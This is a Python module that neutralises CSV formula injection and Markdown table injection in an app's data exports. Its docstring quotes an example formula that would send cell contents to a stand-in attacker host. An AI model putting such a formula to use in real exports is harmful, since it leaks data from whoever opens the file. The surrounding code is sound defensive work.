"""One CSV path for every export in the app.

Rule names, descriptions, dictionary and engine names come from the
tenant, and any ZIA admin can set them. A spreadsheet treats a cell that
starts with = + - @ TAB or CR as a formula, so a rule named
'=HYPERLINK("http://attacker.example/?d="&A1,"Click")' would run on the
auditor's machine when the export is opened in Excel or Sheets.

``safe_cell`` prefixes such a text cell with a single quote so it is shown
as text (OWASP CSV injection guidance). Numbers, and text that is only a
plain number such as "-5", are left as they are. ``writer`` and
``dict_writer`` wrap csv.writer / csv.DictWriter so every row goes through
``safe_cell``; use them instead of the csv module's writers.
"""
from __future__ import annotations

import csv
import re
from typing import Any, Iterable, Mapping

_TRIGGERS = ("=", "+", "-", "@", "\t", "\r", "\n")
_LONE_SURROGATE = re.compile("[\ud800-\udfff]")
_BIDI = re.compile("[\u202a-\u202e\u2066-\u2069]")
_PLAIN_NUMBER = re.compile(r"[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?")


def safe_cell(value: Any) -> Any:
    """Return ``value`` made safe to open in a spreadsheet."""
    if not isinstance(value, str) or not value:
        return value
    # A lone surrogate (from a JSON \uD800 escape) cannot be written as
    # UTF-8: it would fail the whole download. Show U+FFFD instead.
    value = _LONE_SURROGATE.sub("\ufffd", value)
    # An explicit bidirectional control (U+202E in a tenant name) as U+FFFD,
    # as every export shows it (md_safe.no_bidi).
    value = _BIDI.sub("\ufffd", value)
    if value[0] in _TRIGGERS and not _PLAIN_NUMBER.fullmatch(value):
        return "'" + value
    return value


def safe_row(row: Iterable[Any]) -> list:
    return [safe_cell(v) for v in row]


class _SafeWriter:
    def __init__(self, inner):
        self._w = inner

    def writerow(self, row: Iterable[Any]):
        return self._w.writerow(safe_row(row))

    def writerows(self, rows: Iterable[Iterable[Any]]):
        for row in rows:
            self.writerow(row)

    @property
    def dialect(self):
        return self._w.dialect


class _SafeDictWriter:
    def __init__(self, inner: csv.DictWriter):
        self._w = inner
        self.fieldnames = inner.fieldnames

    def writeheader(self):
        return self._w.writer.writerow(safe_row(self._w.fieldnames))

    def writerow(self, row: Mapping[str, Any]):
        return self._w.writerow({k: safe_cell(v) for k, v in row.items()})

    def writerows(self, rows: Iterable[Mapping[str, Any]]):
        for row in rows:
            self.writerow(row)


def writer(f, *args, **kwargs) -> _SafeWriter:
    """csv.writer whose rows are sanitised cell by cell."""
    return _SafeWriter(csv.writer(f, *args, **kwargs))


def dict_writer(f, fieldnames, *args, **kwargs) -> _SafeDictWriter:
    """csv.DictWriter whose values are sanitised cell by cell."""
    return _SafeDictWriter(csv.DictWriter(f, fieldnames, *args, **kwargs))


_MD_BREAKS = re.compile(r"\r\n|[\r\n\v\f\x85\u2028\u2029]")


def md_cell(value: Any) -> str:
    """Text for one cell of a Markdown table: on one line, with its pipes
    escaped. A tenant name such as "Allow | Finance" would otherwise add a
    column and shift every value after it, and a line break would end the
    row."""
    s = "" if value is None else str(value)
    return _MD_BREAKS.sub(" ", s).replace("|", "\\|")
